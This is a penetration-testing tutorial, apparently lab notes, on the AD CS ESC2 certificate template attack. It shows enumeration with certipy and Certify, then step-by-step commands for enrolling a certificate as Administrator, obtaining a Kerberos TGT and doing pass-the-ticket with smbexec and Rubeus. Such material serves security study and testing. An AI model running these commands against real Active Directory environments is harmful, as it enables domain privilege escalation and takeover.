This is another attack vector available and targets specifically the *Certificate Templates* itself and more specifically this is a variation of the ESC1 type.
To make it easy to understand this attack vector happens when a Certificate template allows choosing "Any purpose" on the EKU(Extended Key Usage) or isn't defining any at all; in this case we can use it to enroll a certificate for any purpose we might need example(client authentication, server authentication, code signing, etc.)


## Requisites
In order to pursuit this path the the steps are same as the ESC1 and must be fulfilled:
1. The Enterprise CA must provide enrollment rights to low-privileged users.
2. Manager approval should be turned off.
3. No authorized signatures should be necessary.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template should define Any Purpose Extended Key Usage or have no Extended Key Usage specified.


## Enumeration
To identify potential Templates that can be used to carry an ESC2 type attack we can do:
**Linux:**
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)
<SNIP>
Certificate Templates
    3
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'LAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'LAB.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'LAB.LOCAL\\Domain Users' can enroll, and the template has Certificate Request Agent EKU set
<SNIP>
```
In this case we can see that our requirements are fulfilled as:
- Enrollment Rights: `LAB.LOCAL\Domain Users`.
- Requires Manager Approval: `False`.
- Authorized Signature Required: `0`.
- Client Authentication: `True` or Extended Key Usage `Any`.
- Enrollee Supplies Subject: `True` aka alternative SAN. *De-facto can be categorized as ESC1  as well*

**Windows:**
```
.\Certify.exe find /vulnerable
Example:
<SNIP>  
[!] Vulnerable Certificates Templates :

    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC2
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Any Purpose
    mspki-certificate-application-policy  : Any Purpose
    Permissions
```


# Attack Time
The attack vector can be performed on same ways both from a Window or Linux based OS.
## Linux way
After we identified the vulnerable Template, CA-Name and ascertain that we are allowed to enroll as Domain user we can proceed with the attack.
- Starting by enrolling a new certificate with the vulnerable template
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.207.213 -ca lab-LAB-DC-CA -template ESC2 -upn Administrator@lab.local 
```
- We use the *pfx* certificate to perform authentication on behalf of Administrator and ask a TGT ticket.
```
certipy-ad auth -pfx administrator.pfx -username Administrator -domain lab.local -dc-ip 10.129.207.213
```
- Lastly, we need to point the ticket in *ccache* format to be used in a *PassTheTicket* type attack and login into the server as Administrator (use the FQDN of the DC)
```
export KRB5CCNAME=administrator.ccache
smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
```
## Windows way
The same attack can be done directly from a Windows machine.
- We can start by enrolling a new certificate via Certify.exe
```
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC2 /altname:administrator@lab.local
```
- Next we need to convert the generated certificate to a valid *pfx* which contains the private-key as well. **OBS: Password can be left void.**
```
 & "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- Now we can use the certificate to perform a client authentication and obtain a TGT ticket that can be used afterwards in same session.
```
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap /ptt
```
With the token injected into current session we can take it further and perform the attack type *PassTheTicket* to go in deeper into the environment.